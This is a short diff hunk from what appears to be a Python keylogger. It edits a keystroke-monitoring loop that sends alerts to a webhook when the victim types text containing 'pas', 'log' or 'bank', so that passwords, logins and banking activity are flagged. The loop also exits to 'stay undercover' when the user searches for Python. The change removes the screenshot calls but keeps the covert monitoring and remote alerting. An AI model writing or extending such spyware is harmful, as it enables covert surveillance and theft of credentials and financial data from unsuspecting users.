@@ -248,15 +248,12 @@ def monitor_input():
                 send_to_webhook("User searched for Python. Killing process to stay undercover.")
                 os._exit(0)
             elif "pas" in keystrokes.lower():
-                screenshot()
                 send_to_webhook("@everyone Password!")
                 send_to_webhook("#screenshots")
             elif "log" in keystrokes.lower():
-                screenshot()
                 send_to_webhook("@everyone Login!")
                 send_to_webhook("#screenshots")
             elif "bank" in keystrokes.lower():
-                screenshot()
                 send_to_webhook("@everyone Bank!")
                 send_to_webhook("#screenshots")
                 
